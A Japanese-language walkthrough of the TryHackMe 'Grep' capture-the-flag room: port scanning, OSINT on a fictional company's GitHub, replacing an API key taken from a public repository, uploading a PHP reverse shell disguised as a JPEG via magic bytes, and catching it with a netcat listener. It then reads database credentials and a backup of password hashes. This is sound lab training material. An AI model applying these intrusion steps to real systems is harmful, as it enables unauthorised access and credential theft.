# Grep CTF

https://tryhackme.com/room/greprtp

OSINT スキルが必要と書かれている。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.62.83
root@ip-10-10-148-179:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-28 05:19 GMT
Nmap scan report for 10.10.62.83
Host is up (0.031s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
51337/tcp open  unknown
MAC Address: 02:77:6E:0A:25:6F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
root@ip-10-10-148-179:~# sudo nmap -sV -p22,80,443,51337 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-28 05:19 GMT
Nmap scan report for 10.10.62.83
Host is up (0.0088s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
443/tcp   open  ssl/http Apache httpd 2.4.41
51337/tcp open  ssl/http Apache httpd 2.4.41
MAC Address: 02:77:6E:0A:25:6F (Unknown)
Service Info: Host: ip-10-10-62-83.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- SSH、HTTP、HTTPS。
- 80 は Apache インストールページ。
- 443, 51337 は HTTPS だが Forbidden 表示。

### OSINT

https://github.com/Super-Secure-Company

https://www.linkedin.com/feed/update/urn:li:activity:7234567923971833856/

```
http://supersecurecompany.xyz/

info@supersecurecompany.xyz
hr@supersecurecompany.com

dirk.vanbroeck@supersecurecompany.xyz

tel: +32 9 331 49 00
```

hosts に supersecurecompany.xyz を設定しても変わらなかった。

### 証明書

- HTTPS(443) の証明書を見ると、grep.thm
- HTTPS(51337) は、leakchecker.grep.thm

hosts に追加してブラウザ表示すると、

https://grep.thm は SearchME  
https://leakchecker.grep.thm:51337 は、leakchecker が表示される

## SearchMe

ユーザー登録しようとすると、API キーが期限切れ表示。

```http
POST /api/register.php HTTP/1.1
Host: grep.thm
Cookie: PHPSESSID=e486mda8l710l697s787u35hoh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://grep.thm/public/html/register.php
Content-Type: application/json
X-Thm-Api-Key: e8d25b4208b80008a9e15c8698640e85
Content-Length: 70
Origin: https://grep.thm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive

{"username":"aaa","password":"abc","email":"aaa@thm.com","name":"aaa"}
```

GitHub で「X-Thm-Api-Key」で検索すると、下記リポジトリがヒットする。  
https://github.com/supersecuredeveloper/searchmecms

```python
if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ひみつ') {
```

Burp プロキシでインターセプトして API キーを差し替えると、ユーザー登録できた。  
そしてログインするとフラグが表示される。

次の質問は、「admin ユーザーのメールアドレス」  
admin がポストしたテストコメントは表示されているが・・・？

リポジトリに upload.php があったので、試してみたら存在した。

https://grep.thm/public/html/upload.php

[リポジトリの実装](https://github.com/supersecuredeveloper/searchmecms/blob/main/api/upload.php)を見ると、

- 拡張子チェックは未実装
- 最初の 4 バイトが、jpg, png, bmp のいずれかと一致したら OK としている。

pentestmonkey の PHP を、最初の 4 バイトを操作して JPEG に見せかける。

```shell
$ file ./pentest.php
./pentest.php: JPEG image data
```

アップロードすると、成功メッセージが返ってきた。

```
{"message":"File uploaded successfully."}
```

https://grep.thm/api/uploads/pentest.php にアクセスするとシェルを取得できた。

```shell
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.62.83] 40064
Linux ip-10-10-62-83 5.15.0-1038-aws #43~20.04.1-Ubuntu SMP Fri Jun 2 17:10:57 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 07:03:39 up  1:46,  0 users,  load average: 0.04, 0.01, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$
```

## シェル

config.php に DB 接続情報がありそうなことは気づいていたので確認。

```shell
www-data@ip-10-10-62-83:/var/www/html$ cat /var/www/html/api/config.php
<?php

$host = 'localhost';
$db   = 'postman';
$user = 'root';
$pass = 'password';
$mysqli = new mysqli($host, $user, $pass, $db);

if ($mysqli->connect_error) {
    die('Connect Error (' . $mysqli->connect_errno . ') ' . $mysqli->connect_error);
}
?>
```

しかし、mysql コマンドは root しか使えない設定になっていた。

```shell
www-data@ip-10-10-62-83:/var/www/html$ ls -al /usr/bin/mysql
-r-x------ 1 root root 7799952 May 11  2023 /usr/bin/mysql
```

簡単に root 昇格の手がかりを探したが、見つからなかった。

/var/www にバックアップディレクトリがあった。

```shell
www-data@ip-10-10-62-83:/home$ find / -type d -name "*backup*" 2>/dev/null
/snap/core20/1891/var/backups
/snap/core20/1169/var/backups
/snap/core/14946/var/backups
/snap/core/15419/var/backups
/snap/core18/2785/var/backups
/snap/core18/2751/var/backups
/var/backups
/var/cache/dbconfig-common/backups
/var/www/backup

www-data@ip-10-10-62-83:/home$ ls /var/www/backup
users.sql
```

この中に admin ユーザーのメールアドレスが入っていた。

```sql
INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'ひみつ', 'Admin User', 'admin');
```

## LeakChecker

admin ユーザーのメールアドレスを入れたら、パスワードが表示されて終わり。

## 振り返り

- OSINT 系のチャレンジは、検索するとウォークスルーが多く出てきて、ノイズが多くてしんどい。
- 最後のメールアドレスを grep で探すとしたら、どんなコマンドが有効だったか？

除外パス盛り盛りと長さ制限を加えて、この程度なら許容範囲か？

```shell
www-data@ip-10-10-62-83:/home$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "admin" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000' | grep '.*@.*\..*'
/etc/apache2/sites-available/000-default.conf:        ServerAdmin webmaster@grep.thm
/etc/apache2/sites-available/leakchecker.conf:  ServerAdmin webmaster@leakchecker.grep.thm
/var/backups/dpkg.status.0:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/backups/dpkg.status.0:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/backups/dpkg.status.0:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/backups/dpkg.status.0:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/backups/dpkg.status.0:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/backups/dpkg.status.0:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/backups/dpkg.status.0:Original-Maintainer: phpMyAdmin Packaging Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/info/phpmyadmin.list:/usr/share/phpmyadmin/locale/sr@latin/LC_MESSAGES/phpmyadmin.mo
/var/lib/dpkg/info/phpmyadmin.md5sums:c6dad3c47c17167b1cdc10c2bbfa42b9  usr/share/phpmyadmin/locale/sr@latin/LC_MESSAGES/phpmyadmin.mo
/var/lib/dpkg/info/libkrb5-26-heimdal:amd64.symbols: krb5_get_krb_admin_hst@HEIMDAL_KRB5_2.0 1.4.0+git20110226
/var/lib/dpkg/info/libkrb5-26-heimdal:amd64.symbols: krb5_get_use_admin_kdc@HEIMDAL_KRB5_2.0 1.4.0+git20110226
/var/lib/dpkg/info/libkrb5-26-heimdal:amd64.symbols: krb5_set_use_admin_kdc@HEIMDAL_KRB5_2.0 1.4.0+git20110226
/var/lib/dpkg/info/libsgutils2-2.symbols: sg_lib_nvme_admin_cmd_arr@Base 1.43
/var/lib/dpkg/status:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status:Original-Maintainer: phpMyAdmin Packaging Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status-old:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status-old:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status-old:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status-old:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status-old:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status-old:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/dpkg/status-old:Original-Maintainer: phpMyAdmin Packaging Team <team+phpmyadmin@tracker.debian.org>
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_focal_universe_binary-amd64_Packages:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_focal_universe_binary-amd64_Packages:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_focal_universe_binary-amd64_Packages:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_focal_universe_binary-amd64_Packages:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_focal_universe_binary-amd64_Packages:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_focal_universe_binary-amd64_Packages:Original-Maintainer: phpMyAdmin Team <team+phpmyadmin@tracker.debian.org>
/var/lib/apt/lists/eu-west-1.ec2.archive.ubuntu.com_ubuntu_dists_focal_universe_binary-amd64_Packages:Original-Maintainer: phpMyAdmin Packaging Team <team+phpmyadmin@tracker.debian.org>
/var/www/backup/users.sql:(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'ひみつメールアドレス', 'Admin User', 'admin');
```
